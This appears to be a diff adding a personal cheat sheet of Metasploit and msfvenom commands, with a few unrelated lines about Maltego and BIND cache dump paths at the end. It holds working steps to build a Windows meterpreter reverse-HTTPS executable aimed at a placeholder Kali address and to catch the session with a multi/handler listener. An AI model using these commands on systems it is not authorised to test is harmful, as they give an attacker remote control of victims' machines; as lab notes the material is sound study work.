@@ -1,0 +1,70 @@
+Metasploit===STEPS===
+Metasploit is an exploit development and execution tool and framework
+msfconsole
+help
+show [something]
+use [something]
+set [option] [value]
+
+--Test_1
+use exploit/multi/handle
+set PAYLOAD [veil payload]
+set LHOST [your ip]
+set LPORT [veil port]
+exploit
+
+--Configured
+use exploit/multi/handle
+sessions
+show options
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST <Kali_IP_Address>
+set LPORT 8080
+exploit
+
+--To see available module options:
+show options
+help
+version
+show all
+search <keyword>
+info <module>
+back
+exit
+
+help
+search ssh
+info auxiliary/scanner/ssh/ssh_version
+
+--To view active sessions
+sessions
+sessions -l
+
+msfvenom===STEPS===
+msfvenom
+msfvenom -l p
+msfvenom -l p | grep meter
+msfvenom -p windows/meterpreter_reverse_https --list-options
+msfvenom -p windows/meterpreter_reverse_https --list-o
+msfvenom --list formats
+
+--configured
+msfvenom
+msfvenom --list formats
+msfvenom --payload windows/meterpreter/reverse_https LHOST=(Kali_IPAddress) LPORT=8080 --format exe --out reverse_8080.exe
+msfvenom -p windows/meterpreter_reverse_https LHOST=<Kali_IP> LPORT=8080 -f exe -o ~/reverse_8080.exe
+
+msfvenom -p windows/meterpreter_reverse_https LHOST=<Kali_IP> LPORT=8080 -f exe -o reverse_8080.exe
+
+service apache2 start
+service apache2 stop
+Maltego
+
+--To Check any active jobs
+jobs -l
+jobs -i 0
+sessions -l
+
+If you have customized the directory option in your /etc/bind/named.conf.options file
+If you are using Red Hat, CentOS, or Fedora, the file path is typically /var/named/data/cache_dump.db
+/var/cache/bind/named_dump.db
